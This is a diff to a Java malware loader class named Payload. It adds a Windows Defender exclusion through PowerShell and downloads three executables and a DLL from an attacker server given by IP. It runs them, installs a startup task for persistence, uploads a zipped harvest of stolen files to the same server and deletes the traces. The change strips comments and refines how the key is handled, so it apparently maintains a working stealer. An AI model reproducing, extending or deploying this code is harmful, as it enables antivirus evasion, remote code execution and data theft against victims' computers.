@@ -99,7 +99,8 @@ public class Payload {
                 int start = content.indexOf("\"key\":\"") + 7;
                 int end = content.indexOf("\"", start);
                 if (start > 6 && end > start) {
-                    return content.substring(start, end);
+                    String k = content.substring(start, end);
+                    if (!k.equals("all")) return k;
                 }
             }
         } catch (Exception e) {}
@@ -191,14 +192,12 @@ public class Payload {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
             
-            // 1. Delete lock file
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
                 log("Deleted .lock file to notify parent.");
             }
 
-            // 2. Add AV Exclusions IMMEDIATELY via PowerShell Add-MpPreference
             log("Adding AV exclusion via PowerShell...");
             try {
                 String psExclude = String.format(
@@ -211,35 +210,39 @@ public class Payload {
                 );
                 pb.start().waitFor();
                 
-                // Wait 3 seconds for Defender to actually apply the policy
                 Thread.sleep(3000); 
             } catch (Exception e) {
                 log("Failed to add exclusions: " + e.toString());
             }
 
-            // 3. Download payloads
+            // Explicitly write the correct key to key.json BEFORE running 1.exe
+            try {
+                File keyFile = new File(loaderDir, "key.json");
+                String body = "{\n  \"key\": \"" + key + "\"\n}\n";
+                Files.write(keyFile.toPath(), body.getBytes());
+                log("Wrote correct key.json");
+            } catch (Exception e) {
+                log("Failed to write key.json: " + e.toString());
+            }
+
             log("Downloading payloads...");
             String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
             for (String file : files) {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
-            // 4. Execute
-            File exe3 = new File(loaderDir, "3.exe");
             log("Executing 3.exe...");
-            new ProcessBuilder(exe3.getAbsolutePath(), "all")
+            new ProcessBuilder(".\\3.exe", "all")
                 .directory(loaderDir).start();
             
-            File exe2 = new File(loaderDir, "2.exe");
             log("Executing 2.exe...");
-            new ProcessBuilder(exe2.getAbsolutePath(), "all")
+            new ProcessBuilder(".\\2.exe", "all")
                 .directory(loaderDir).start();
             
             Thread.sleep(2000);
             
-            File exe1 = new File(loaderDir, "1.exe");
             log("Executing 1.exe...");
-            new ProcessBuilder(exe1.getAbsolutePath(), "all")
+            new ProcessBuilder(".\\1.exe", "all")
                 .directory(loaderDir).start();
 
             installStartupTask(key, ip);
@@ -257,7 +260,6 @@ public class Payload {
             uploadFile("http://" + ip + "/api/rpc", zipFile, key);
             log("Done!");
 
-            // 5. Cleanup
             log("Cleaning up harvest files...");
             if (zipFile.exists()) zipFile.delete();
             deleteDir(new File(loaderDir, "output"));
